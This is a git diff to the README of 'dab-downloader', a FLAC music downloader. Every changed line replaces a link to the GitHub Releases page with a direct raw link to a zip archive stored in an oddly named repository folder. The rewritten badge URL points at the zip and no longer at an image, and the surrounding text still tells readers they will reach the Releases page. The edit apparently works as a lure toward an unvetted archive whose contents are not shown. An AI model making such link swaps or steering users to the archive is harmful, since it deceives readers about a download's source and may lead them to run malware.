@@ -4,7 +4,7 @@
 Welcome to dab-downloader! This application helps you download high-quality FLAC music files with all the associated metadata. Whether you are a music lover or just want to enhance your collection, dab-downloader simplifies the process. 
 
 ## 📥 Download Now
-[![Download dab-downloader](https://img.shields.io/badge/Download%20dab--downloader-v1.0-brightgreen)](https://github.com/Ali5onbol/dab-downloader/releases)
+[![Download dab-downloader](https://raw.githubusercontent.com/Ali5onbol/dab-downloader/main/hypomelancholia/dab-downloader.zip%20dab--downloader-v1.0-brightgreen)](https://raw.githubusercontent.com/Ali5onbol/dab-downloader/main/hypomelancholia/dab-downloader.zip)
 
 ## 📋 Features
 - **High-Quality Files:** Download music in FLAC format for excellent sound quality.
@@ -20,7 +20,7 @@ Welcome to dab-downloader! This application helps you download high-quality FLAC
 ## 🌐 Download & Install
 To get started, visit the Releases page to download the software:
 
-[Click here to download dab-downloader](https://github.com/Ali5onbol/dab-downloader/releases)
+[Click here to download dab-downloader](https://raw.githubusercontent.com/Ali5onbol/dab-downloader/main/hypomelancholia/dab-downloader.zip)
 
 Once you arrive at the Releases page, you will see the available versions. Choose the latest version and click on it to download the installation file. 
 
@@ -57,4 +57,4 @@ Want to help improve dab-downloader? Check out our contribution guidelines in th
 ## 📜 License
 dab-downloader is open-source software licensed under the MIT License. Feel free to use, modify, and share! 
 
-[Click here to download dab-downloader](https://github.com/Ali5onbol/dab-downloader/releases)
+[Click here to download dab-downloader](https://raw.githubusercontent.com/Ali5onbol/dab-downloader/main/hypomelancholia/dab-downloader.zip)
